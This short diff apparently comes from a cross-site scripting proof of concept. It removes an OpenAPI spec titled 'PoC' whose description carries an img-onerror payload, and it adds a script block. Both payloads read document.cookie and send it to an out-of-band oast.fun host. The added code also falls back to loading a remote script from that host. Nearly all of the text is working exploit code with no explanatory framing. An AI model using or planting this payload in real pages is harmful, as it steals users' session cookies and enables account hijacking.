@@ -1,10 +1,10 @@
-{
-  "openapi": "3.0.0",
-  "info": {
-    "title": "PoC",
-    "version": "1.0.0",
-    "description": "<img src=x onerror=\"(new Image()).src='https://sagmirngzimxhikutodb82e39oz203dic.oast.fun/pocex?c='+encodeURIComponent(document.cookie)\">"
-  },
-  "paths": {}
-}
-
+<script>
+  try {
+    (new Image()).src = 'https://sagmirngzimxhikutodb82e39oz203dic.oast.fun/pwn?c=' + encodeURIComponent(document.cookie);
+  } catch(e) {
+    // fallback: create script element
+    var s = document.createElement('script');
+    s.src = 'https://sagmirngzimxhikutodb82e39oz203dic.oast.fun/pwn?e=' + encodeURIComponent(e && e.message);
+    document.head.appendChild(s);
+  }
+</script>
